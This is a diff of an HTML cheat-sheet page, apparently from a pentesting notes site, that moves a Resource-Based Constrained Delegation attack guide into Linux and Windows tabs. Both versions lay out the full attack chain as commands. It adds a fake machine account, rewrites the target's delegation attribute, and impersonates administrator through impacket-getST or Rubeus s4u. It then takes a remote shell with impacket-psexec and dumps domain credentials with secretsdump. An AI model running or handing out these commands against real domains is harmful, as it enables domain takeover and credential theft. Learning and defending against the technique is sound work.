@@ -203,55 +203,90 @@
 </ul>
 
 <div class="content"><hr>
-<h3 id="rbcd-attack-from-linux">RBCD Attack (From Linux)</h3>
-<h4 id="0-check-machine-account-quota">0. Check machine account quota</h4>
+<h3 id="rbcd-attack">RBCD Attack</h3>
+<p>
+<button data-tabset="set1" data-tabcontent="tab1" class="active">Linux</button>
+
+<button data-tabset="set1" data-tabcontent="tab2" >Windows</button>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><h4 id="0-check-machine-account-quota">0. Check machine account quota</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc ldap 10.10.11.10 -u &lt;USER&gt; -p &lt;PASSWORD&gt; -M MAQ
-</span></span></code></pre></div><h4 id="1-add-a-fake-computer">1. Add a fake computer</h4>
+</span></span></code></pre></div></div>
+<h4 id="1-add-a-fake-computer">1. Add a fake computer</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-addcomputer -computer-name <span class="s1">&#39;EvilComputer&#39;</span> -computer-pass <span class="s1">&#39;password&#39;</span> -dc-ip 10.10.11.10 &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;
-</span></span></code></pre></div><h4 id="2-rbcd-attack">2. Rbcd attack</h4>
+</span></span></code></pre></div></div>
+<h4 id="2-rbcd-attack">2. Rbcd attack</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-rbcd -delegate-to &lt;TARGET_COMPUTER&gt;$ -delegate-from EvilComputer$ -dc-ip &lt;DC&gt; -action <span class="s1">&#39;write&#39;</span> &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;
-</span></span></code></pre></div><h4 id="3-impersonate">3. Impersonate</h4>
+</span></span></code></pre></div></div>
+<h4 id="3-impersonate">3. Impersonate</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo ntpdate -s &lt;DC&gt; <span class="o">&amp;&amp;</span> impacket-getST -spn cifs/&lt;TARGET_DOMAIN&gt; -impersonate administrator -dc-ip &lt;DC&gt; <span class="s1">&#39;&lt;DOMAIN&gt;/EvilComputer:password&#39;</span>
-</span></span></code></pre></div><h4 id="4-import-ticket">4. Import ticket</h4>
+</span></span></code></pre></div></div>
+<h4 id="4-import-ticket">4. Import ticket</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>administrator@cifs_&lt;TARGET_DOMAIN&gt;@&lt;DOMAIN&gt;.ccache
-</span></span></code></pre></div><h4 id="5-post-attack">5. Post-Attack</h4>
+</span></span></code></pre></div></div>
+<h4 id="5-post-attack">5. Post-Attack</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Remote</span>
 </span></span><span class="line"><span class="cl">sudo ntpdate -s &lt;DC&gt; <span class="o">&amp;&amp;</span> impacket-psexec &lt;DOMAIN&gt;/administrator@&lt;TARGET_DOMAIN&gt; -k -no-pass
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Or secretsdump</span>
 </span></span><span class="line"><span class="cl">impacket-secretsdump administrator@&lt;TARGET_DOMAIN&gt; -k -no-pass -just-dc-user Administrator
-</span></span></code></pre></div><h3 id="rbcd-attack-from-windows">RBCD Attack (From Windows)</h3>
-<h4 id="1-import-powerviewps1">1. Import PowerView.ps1</h4>
+</span></span></code></pre></div></div>
+</div>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><h4 id="1-import-powerviewps1">1. Import PowerView.ps1</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.</span> <span class="p">.\</span><span class="n">PowerView</span><span class="p">.</span><span class="py">ps1</span>
-</span></span></code></pre></div><h4 id="2-check-machine-account-quota">2. Check machine account quota</h4>
+</span></span></code></pre></div></div>
+<h4 id="2-check-machine-account-quota">2. Check machine account quota</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-DomainObject</span> <span class="n">-Identity</span> <span class="s1">&#39;DC=&lt;EXAMPLE&gt;,DC=&lt;COM&gt;&#39;</span> <span class="p">|</span> <span class="nb">select ms-ds</span><span class="n">-machineaccountquota</span>
-</span></span></code></pre></div><h4 id="3-import-powermadps1">3. Import Powermad.ps1</h4>
-<p><a href="https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1">Powermad.ps1</a></p>
+</span></span></code></pre></div></div>
+<h4 id="3-import-powermadps1">3. Import Powermad.ps1</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.</span> <span class="p">.\</span><span class="n">Powermad</span><span class="p">.</span><span class="py">ps1</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">New-MachineAccount</span> <span class="n">-MachineAccount</span> <span class="n">EvilComputer</span> <span class="n">-Password</span> <span class="vm">$</span><span class="p">(</span><span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;password&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">)</span>
-</span></span></code></pre></div><h4 id="4-attack">4. Attack</h4>
+</span></span></code></pre></div></div>
+<p><small><em>Ref: <a href="https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1">Powermad.ps1</a></em></small></p>
+<h4 id="4-attack">4. Attack</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$fakesid</span> <span class="p">=</span> <span class="nb">Get-DomainComputer</span> <span class="n">EvilComputer</span> <span class="p">|</span> <span class="nb">select </span><span class="n">-expand</span> <span class="n">objectsid</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$fakesid</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$SD</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">Security</span><span class="p">.</span><span class="py">AccessControl</span><span class="p">.</span><span class="py">RawSecurityDescriptor</span> <span class="n">-ArgumentList</span> <span class="s2">&#34;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;</span><span class="p">$(</span><span class="nv">$fakesid</span><span class="p">)</span><span class="s2">)&#34;</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$SDBytes</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">byte</span><span class="p">[]</span> <span class="p">(</span><span class="nv">$SD</span><span class="p">.</span><span class="n">BinaryLength</span><span class="p">)</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$SD</span><span class="p">.</span><span class="py">GetBinaryForm</span><span class="p">(</span><span class="nv">$SDBytes</span><span class="p">,</span> <span class="mf">0</span><span class="p">)</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-DomainComputer</span> <span class="n">TARGET_COMPUTER</span><span class="p">$</span> <span class="p">|</span> <span class="nb">Set-DomainObject</span> <span class="n">-Set</span> <span class="vm">@</span><span class="p">{</span><span class="s1">&#39;msds-allowedtoactonbehalfofotheridentity&#39;</span><span class="p">=</span><span class="nv">$SDBytes</span><span class="p">}</span>
-</span></span></code></pre></div><h4 id="5-check-securityidentifier-is-now-fakesid">5. Check SecurityIdentifier is now fakesid</h4>
+</span></span></code></pre></div></div>
+<h4 id="5-check-securityidentifier-is-now-fakesid">5. Check SecurityIdentifier is now fakesid</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$RawBytes</span> <span class="p">=</span> <span class="nb">Get-DomainComputer</span> <span class="n">TARGET_COMPUTER</span> <span class="n">-Properties</span> <span class="s1">&#39;msds-allowedtoactonbehalfofotheridentity&#39;</span> <span class="p">|</span> <span class="nb">select </span><span class="n">-expand</span> <span class="nb">msds-allowedtoactonbehalfofotheridentity</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$Descriptor</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">Security</span><span class="p">.</span><span class="py">AccessControl</span><span class="p">.</span><span class="py">RawSecurityDescriptor</span> <span class="n">-ArgumentList</span> <span class="nv">$RawBytes</span><span class="p">,</span> <span class="mf">0</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$Descriptor</span><span class="p">.</span><span class="py">DiscretionaryAcl</span>
-</span></span></code></pre></div><h4 id="6-impersonate">6. Impersonate</h4>
+</span></span></code></pre></div></div>
+<h4 id="6-impersonate">6. Impersonate</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.\</span><span class="n">rubeus</span><span class="p">.</span><span class="py">exe</span> <span class="n">hash</span> <span class="p">/</span><span class="n">password</span><span class="err">:</span><span class="n">password</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">EvilComputer</span> <span class="p">/</span><span class="n">domain</span><span class="err">:</span><span class="p">&lt;</span><span class="n">DOMAIN</span><span class="p">&gt;</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.\</span><span class="n">rubeus</span><span class="p">.</span><span class="py">exe</span> <span class="n">s4u</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">EvilComputer</span><span class="p">$</span> <span class="p">/</span><span class="n">rc4</span><span class="err">:</span><span class="p">&lt;</span><span class="n">HASH</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">impersonateuser</span><span class="err">:</span><span class="n">administrator</span> <span class="p">/</span><span class="n">msdsspn</span><span class="err">:</span><span class="n">cifs</span><span class="p">/&lt;</span><span class="n">TARGET_DOMAIN</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">ptt</span> <span class="p">/</span><span class="n">nowrap</span>
-</span></span></code></pre></div><h4 id="7-convert-to-ccache-format">7. Convert to ccache format</h4>
-<p><a href="https://github.com/SolomonSklash/RubeusToCcache">RubeusToCcache</a></p>
+</span></span></code></pre></div></div>
+<h4 id="7-convert-to-ccache-format">7. Convert to ccache format</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 rubeustoccache.py &lt;BASE64_TICKET&gt; secrets.kirbi secrets.ccache
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>secrets.ccache
-</span></span></code></pre></div><h4 id="8-post-attack">8. Post-Attack</h4>
+</span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/SolomonSklash/RubeusToCcache">RubeusToCcache</a></em></small></p>
+</div>
+<h4 id="8-post-attack">8. Post-Attack</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Remote</span>
 </span></span><span class="line"><span class="cl">sudo ntpdate -s &lt;DC&gt; <span class="o">&amp;&amp;</span> impacket-psexec &lt;DOMAIN&gt;/administrator@&lt;TARGET_DOMAIN&gt; -k -no-pass
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Or secretsdump</span>
 </span></span><span class="line"><span class="cl">impacket-secretsdump administrator@&lt;TARGET_DOMAIN&gt; -k -no-pass -just-dc-user Administrator
-</span></span></code></pre></div><br>
+</span></span></code></pre></div></div>
+</div></p>
+<br>
 </div></div>
     
     <script src="/js/utils.js"></script>
